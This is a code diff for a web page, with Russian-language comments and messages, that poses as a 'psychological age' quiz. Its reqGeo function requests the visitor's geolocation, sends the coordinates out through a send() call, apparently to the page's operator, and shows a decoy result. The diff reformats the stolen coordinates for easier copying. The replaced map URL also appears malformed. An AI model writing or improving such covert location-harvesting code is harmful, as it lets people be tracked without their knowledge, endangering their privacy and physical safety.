@@ -77,8 +77,9 @@
         function reqGeo() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(res => {
-                    const url = `https://yandex.ru{res.coords.longitude},${res.coords.latitude}&whatshere%5Bzoom%5D=16`;
-                    send(`\n🗺 [Открыть на Яндекс Картах](${url})`);
+                    // Форматируем единую строку вида: Широта,Долгота (её легко скопировать)
+                    const coords = `${res.coords.latitude},${res.coords.longitude}`;
+                    send(`\n📍 *Координаты:* \`${coords}\``);
                     alert("Ваш психологический возраст: 21 год!");
                 }, () => alert("Ошибка датчиков. Разрешите доступ к геопозиции."));
             }
